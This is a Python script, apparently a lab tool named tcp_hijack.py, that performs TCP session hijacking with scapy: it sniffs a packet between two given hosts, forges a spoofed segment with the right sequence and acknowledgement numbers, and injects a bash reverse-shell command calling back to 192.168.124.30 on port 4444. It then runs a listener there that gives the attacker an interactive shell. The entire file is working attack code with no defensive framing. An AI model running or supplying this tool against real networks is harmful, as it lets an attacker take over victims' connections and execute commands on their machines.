from scapy.all import *
from sys import argv

import threading
import socket

def start_listener(port):
    """
    Starts a simple reverse shell listener on the attacker
    """
    s = socket.socket()
    s.bind(("", port))
    s.listen(1)
    print(f"Waiting for reverse shell on port {port}...")
    conn, addr = s.accept()
    print(f"Received reverse shell connection from {addr}")

    # Interact with the shell
    try:
        while True:
            cmd = input("$ ")
            if cmd.strip() == "":
                continue
            conn.send((cmd + "\n").encode())
            data = conn.recv(4096)
            print(data.decode(errors="ignore"), end="")
    except KeyboardInterrupt:
        print("\nClosing shell.")
        conn.close()


def main():
    if len(argv) != 4:
        print("Usage: python3 tcp_hijack.py <src_ip> <dst_ip> <dst_port>")
        exit(1)

    src_ip = argv[1]
    dst_ip = argv[2]
    dst_port = int(argv[3])

    print("Sniffing a TCP packet...")

    pkt = sniff(
        filter=f"tcp and host {src_ip} and host {dst_ip} and port {dst_port}", count=1, timeout=5)[0]

    s_ip = pkt[IP].src
    d_ip = pkt[IP].dst
    s_port = pkt[TCP].sport
    d_port = pkt[TCP].dport
    seq = pkt[TCP].ack
    ack = pkt[TCP].seq + len(pkt[TCP].payload)

    cmd = "bash -i >& /dev/tcp/192.168.124.30/4444 0>&1\n"

    spoof = IP(src=s_ip, dst=d_ip) / TCP(sport=s_port, dport=d_port,
                                         flags="PA", seq=seq, ack=ack) / Raw(load=cmd)
    # Start listener in background
    threading.Thread(target=start_listener, args=(4444,), daemon=True).start()

    # Small delay to ensure listener is running
    import time; time.sleep(1)

    send(spoof, verbose=False)

    print("Injection complete")


if __name__ == "__main__":
    main()
